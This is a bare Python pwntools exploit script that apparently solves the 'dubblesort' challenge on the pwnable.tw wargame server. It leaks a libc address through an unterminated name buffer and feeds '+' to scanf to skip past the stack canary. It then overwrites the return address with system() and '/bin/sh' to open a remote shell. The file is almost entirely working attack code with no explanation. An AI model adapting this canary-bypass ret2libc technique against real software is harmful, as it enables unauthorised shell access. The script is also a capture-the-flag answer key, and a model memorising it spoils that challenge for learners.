import os
from pwn import *

pc = './dubblesort'
libc = ELF('./libc.so.6')

remote_ip = 'chall.pwnable.tw'
remote_port = 10101
p = remote(remote_ip,remote_port)
#p = process(pc,env ={'LD_PRELOAD':'./libc.so.6'})
#gdb.attach(p,'b* 0x00000B17+0x56555000\n b* 0x56555000+0xA1D')


context.log_level = True
context.arch = 'i386'


def sla(a,b):
	p.sendlineafter(a,b)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def hack():
	raw_input()
	sla('name :','a'*24)
	p.recvuntil('a'*24)
	libc.address = u32(p.recv(4)) - 0x1b0000 - 0x0a
	lg('libc.address',libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)
	sh_addr = next(libc.search('/bin/sh'))
	lg('sh_addr',sh_addr)


	sla('sort :',str(35))
	for i in range(24):
		sla('number :','0')

	sla('number :','+')
	for i in range(7):
		sla('number :',str(0xf6ffffff))
	sla('number :',str(system_addr))
	sla('number :',str(system_addr+0x100))
	sla('number :',str(sh_addr))

	p.interactive()

hack()